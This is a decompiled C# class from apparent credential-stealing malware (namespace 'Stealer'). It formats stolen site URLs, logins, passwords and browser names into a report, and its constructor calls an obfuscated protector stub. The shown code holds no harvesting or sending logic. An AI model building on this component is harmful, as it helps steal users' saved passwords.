using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Stealer
{
	// Token: 0x0200000B RID: 11
	public class LogPassData
	{
		// Token: 0x06000035 RID: 53 RVA: 0x00004F10 File Offset: 0x00003110
		public override string ToString()
		{
			return string.Format("――――――――――――――――――――――――――――――――――――――――――――\r\nSite     | {0}\r\nLogin    | {1}\r\nPassword | {2}\r\nBrowser  | {3}\r\n", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000036 RID: 54 RVA: 0x000022F2 File Offset: 0x000004F2
		// (set) Token: 0x06000037 RID: 55 RVA: 0x000022FA File Offset: 0x000004FA
		public string Login { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00002303 File Offset: 0x00000503
		// (set) Token: 0x06000039 RID: 57 RVA: 0x0000230B File Offset: 0x0000050B
		public string Password { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00002314 File Offset: 0x00000514
		// (set) Token: 0x0600003B RID: 59 RVA: 0x0000231C File Offset: 0x0000051C
		public string Program { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00002325 File Offset: 0x00000525
		// (set) Token: 0x0600003D RID: 61 RVA: 0x0000232D File Offset: 0x0000052D
		public string Url { get; set; }

		// Token: 0x0600003E RID: 62 RVA: 0x0000224C File Offset: 0x0000044C
		public LogPassData()
		{
			Class13.Cyiv2R6zubiV2();
			base..ctor();
		}

		// Token: 0x04000011 RID: 17
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string FnlDowAle;

		// Token: 0x04000012 RID: 18
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_0;

		// Token: 0x04000013 RID: 19
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_1;

		// Token: 0x04000014 RID: 20
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_2;
	}
}
